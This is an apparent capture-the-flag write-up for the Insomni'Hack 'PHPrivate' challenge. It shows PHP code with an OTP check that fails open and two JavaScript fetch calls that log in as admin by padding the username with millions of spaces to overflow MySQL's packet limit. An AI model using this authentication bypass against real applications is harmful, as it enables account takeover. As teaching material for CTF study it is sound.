## PHPrivate

This challenge allows a user to register, and to upload some confidential data then on the "private" part of the website.

As the code was given, we can see that another feature not displayed on the website allows a user to request for an OTP in case he forgot his password. This process is in 2 steps :

- First, a user can request an OTP for his account. That switches a flag on his account, and creates an OTP in the database.
- Second, a user can confirm its OTP by simply sending it to the application.

The goal was obviously to bypass the OTP verification to login as admin, and then retrieves its private content.

The challenge, as it was for the Insomni'Hack live event, was buggy; a little typo in the code allowed everyone to login as admin with an empty OTP, which is pretty bad. Let's see the real solution instead !

Here is the code that confirms the OTP :

```
public function oneTimeLogin($username, $token){
   global $db;
   if($this->exists($username)){
      $user = mysqli_fetch_all($this->get($username), MYSQLI_ASSOC)[0];
      if($user['isResetting'] == '1') {
         $stmt = mysqli_prepare($db,"SELECT token FROM users_reset WHERE login = ? OR trim(login) = ? ");
         mysqli_stmt_bind_param($stmt,'ss',$username);
         mysqli_stmt_execute($stmt);
         $validToken = (string)mysqli_fetch_all(mysqli_stmt_get_result($stmt),MYSQLI_ASSOC)[0]['token'];
         if($validToken === $token) {
            $stmt = mysqli_prepare($db,"UPDATE users SET isResetting = 0 WHERE login = ?");
            mysqli_stmt_bind_param($stmt,'s',$user['login']);
            mysqli_stmt_execute($stmt);
            $stmt = mysqli_prepare($db,"DELETE FROM users_reset WHERE login = ?");
            mysqli_stmt_bind_param($stmt,'s',$user['login']);
            mysqli_stmt_execute($stmt);
            $_SESSION['logged_in_as'] = $user['login'];
         } else {
            return false;
         }
      }
   }
}
```

If the SQL request that retrieves the token from the database fails, nothing will catch an exception, and the `$validToken` variable will be set to an empty string, which should be ideal to bypass the process.

In its default configuration, MySQL only accepts packets that <16MB. If we're sending a packet that exceeds this size, the packet will be dropped, and the query will fail. As the PHP application accepts file uploads, it is also configured to accept large POST data - a PHPinfo file was available to check for that.
Also, MySQL by default strips space characters from the beginning and the ending of strings, and in every case, a call to trim was done to give a little hint about that. This allows to send the username as admin + ~8 million space to have a packet of over 16MB size.

The following two lines of Javacript allows to become admin :

```
fetch('/phprivate/index.php?page=login&action=ask-otp',{method:"POST", body:"login=admin", headers:{'Content-type':'application/x-www-form-urlencoded'}})

fetch('/phprivate/index.php?page=login&action=confirm-otp',{method:"POST", body:"login=admin"+" ".repeat(8000000)+"&token=", headers:{'Content-type':'application/x-www-form-urlencoded'}})
```
